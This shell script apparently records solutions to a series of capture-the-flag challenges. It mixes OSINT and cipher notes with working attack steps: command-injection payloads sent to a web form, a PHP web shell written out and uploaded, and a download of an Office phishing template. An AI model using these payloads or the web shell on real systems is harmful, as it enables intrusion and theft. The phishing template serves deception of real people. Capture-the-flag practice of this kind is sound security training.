#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define target IP ( the machine to attack ) and attack IP ( the machine which supports the attack )
attack_ip="10.9.5.12"
result_folder="/work/results/"

# Prepare environment
mkdir $result_folder 2>/dev/null
points=0

echo "1 - CATCH ME IF YOU CAN"
# Using google images -> It's in beco de batman Sao Paulo
# It's at a crossroad between Beco de Batman and something starting with H, including an m -> Rua Harmonia
# Though the drawing is not the same under google maps at this specific point, we still recognize the chimney
# Restaurant is Coringa do beco
points=$((points + 15))

echo "2 - CATCH ME IF YOU CAN 2"
# Pigpen cipher on Pele butt : Meet at Torii portal
points=$((points + 30))

echo "3 - CATCH ME IF YOU CAN 3"
# On trip advisor, we find a restaurant named Mr Wok, next to the portal torii da liberdade
# https://www.tripadvisor.com.br/Restaurant_Review-g303631-d14802491-Reviews-Mr_Wok-Sao_Paulo_State_of_Sao_Paulo.html
# Address is Rua Galvão Bueno, 83, São Paulo, Estado de São Paulo 01506-000 Brasil
points=$((points + 60))

echo "4 - NOTEPAD ONLINE"
#target_ip="10.10.66.109"
#curl -s -X GET "http://$target_ip" -L -c $result_folder/cookies.txt > /dev/null
#curl -s -X POST http://$target_ip/ -b $result_folder/cookies.txt -H "Content-Type: application/x-www-form-urlencoded" -d "user=noel&pass=pass1234"
#curl -s -X GET http://$target_ip/note.php?note_id=0 -b $result_folder/cookies.txt -o $result_folder/note.html
FLAG=$(cat $result_folder/note.html | sed -n 's/.*<pre>\([^<]*\).*/\1/p')
echo "--> Flag is '$FLAG'"
points=$((points + 15))

echo "5 - DARK ENCRYPTOR"
#target_ip="10.10.114.117"
#curl -s -X POST "http://$target_ip:5000/" -L -H "Content-Type: application/x-www-form-urlencoded" -d "text_input=test+;+find+/+-type+f+-name+"flag.txt"&recipient=Cipher" -o $result_folder/path.html
FILENAME=$(cat $result_folder/path.html | grep flag.txt)
echo "--> Flag path is '$FILENAME'"
#curl -s -X POST "http://$target_ip:5000/" -L -H "Content-Type: application/x-www-form-urlencoded" -d "text_input=test+;+cat+$FILENAME&recipient=Cipher" -o $result_folder/flag.html
FLAG=$(cat $result_folder/flag.html | grep THM)
echo "--> Flag is '$FLAG'"
points=$((points + 30))

echo "6 - DARK ENCRYPTOR 2"
#target_ip="10.10.174.217"
#SHELL=webshell.txt
#echo "<?php" > $result_folder/$SHELL
#echo "    system(\$_GET[\"cmd\"]);" >> $result_folder/$SHELL
#echo " ?>" >> $result_folder/$SHELL
#curl -s -F "file=@$result_folder/$SHELL;type=application/octet-stream" -F "recipient=ByteReaper" -X POST "http://$target_ip:5000/" -o $result_folder/success-upload.html
#curl -s -X GET http:/$target_ip/uploads/$SHELL?cmd=find+/+-type+f+-name+"flag.txt" -o $result_folder/path.txt

echo "7 - ORDER"
TEXT="1c1c01041963730f31352a3a386e24356b3d32392b6f6b0d323c22243f63731a0d0c302d3b2b1a292a3a38282c2f222d2a112d282c31202d2d2e24352e60"
KNOWN="ORDER:"
python3 $scriptpath/xor.py $TEXT $KNOWN
points=$((points + 30))

echo "8 - DARK MATTER"
# In /tmp, there is the public key which is weak. Using factor db, we find that 340282366920938460843936948965011886881 = 18446744073709551533 · 18446744073709551557 which are prime numbers
# therefore the private key is d = pow(65537, -1, (18446744073709551533 - 1) * (18446744073709551557 - 1)) 
curl -X GET https://factordb.com/index.php?query=3402823669209384608439369489 -o $result_folder/factor.html
points=$((points + 30))

echo "9 - GHOST PHISHING"
wget https://github.com/martinsohn/Office-phish-templates/raw/refs/heads/main/Word.docx -O $result_folder/phishing.docx


echo "Current score : $points"
